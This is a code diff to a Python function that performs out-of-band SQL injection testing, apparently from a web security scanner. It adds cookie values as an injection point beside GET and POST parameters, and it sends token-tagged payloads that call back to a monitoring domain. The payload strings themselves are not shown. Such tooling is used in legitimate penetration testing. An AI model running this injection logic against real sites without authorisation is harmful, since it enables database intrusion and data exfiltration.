@@ -20,6 +20,8 @@ def test_parameter(
     callback_domain: str = "example.com",
     method: str = "get",
     data: dict | None = None,
+    cookies: dict | None = None,
+    location: str = "query",
 ):
     """Attempt OOB SQL injection on a parameter.
 
@@ -28,9 +30,12 @@ def test_parameter(
     token per payload that can be monitored externally.
     """
     data = data or {}
+    cookies = cookies or {}
     parsed = urllib.parse.urlparse(url)
     query = urllib.parse.parse_qs(parsed.query)
-    if method.lower() == "get":
+    if location == "cookie":
+        original = cookies.get(param, "")
+    elif method.lower() == "get":
         original = query.get(param, [''])[0]
     else:
         original = data.get(param, "")
@@ -39,12 +44,20 @@ def test_parameter(
     for template in PAYLOADS:
         token = uuid.uuid4().hex
         payload = template.format(domain=callback_domain, token=token)
-        if method.lower() == "get":
+        if location == "cookie":
+            new_cookies = cookies.copy()
+            new_cookies[param] = original + payload
+            new_url = url
+            try:
+                send_request(new_url, method=method, data=data if method.lower() == "post" else None, cookies=new_cookies)
+            except Exception:
+                pass
+        elif method.lower() == "get":
             query[param] = original + payload
             new_query = urllib.parse.urlencode(query, doseq=True)
             new_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
             try:
-                send_request(new_url)
+                send_request(new_url, cookies=cookies)
             except Exception:
                 pass
         else:
@@ -52,7 +65,7 @@ def test_parameter(
             post_data[param] = original + payload
             new_url = url
             try:
-                send_request(new_url, method="post", data=post_data)
+                send_request(new_url, method="post", data=post_data, cookies=cookies)
             except Exception:
                 pass
         results.append({
